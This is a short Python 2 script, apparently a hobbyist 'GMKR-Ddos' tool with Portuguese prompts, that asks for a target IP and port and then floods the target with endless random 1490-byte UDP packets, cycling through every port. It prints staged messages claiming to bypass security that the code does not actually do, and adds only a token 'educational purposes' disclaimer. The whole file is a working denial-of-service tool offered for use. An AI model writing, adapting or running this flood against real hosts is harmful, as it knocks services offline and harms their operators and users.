import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("limpando")
os.system("figlet GMKR-Ddos")
ip = raw_input("IP alvo : ")
port = input("Port       : ")
os.system("limpando")
os.system("figlet GMKR-Ddos")
print ("\033[92m")
print ("________________TENTANDO ALCANÇAR O SERVER_____________________")
time.sleep(5)
print ("_________________ESTABELECENDO CONEXÕES_______________________")
time.sleep(5)
print ("_________0100100 IGNORANDO A CAMADA DE SEGURANÇA 001010_______________")
time.sleep(5)
print ("_________________CONEXÕES ESTABELECIDAS________________________")
time.sleep(5)
print ("    ATAQUE DDOS INICIADO. NOTA: APENAS PARA FINS EDUCACIONAIS")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1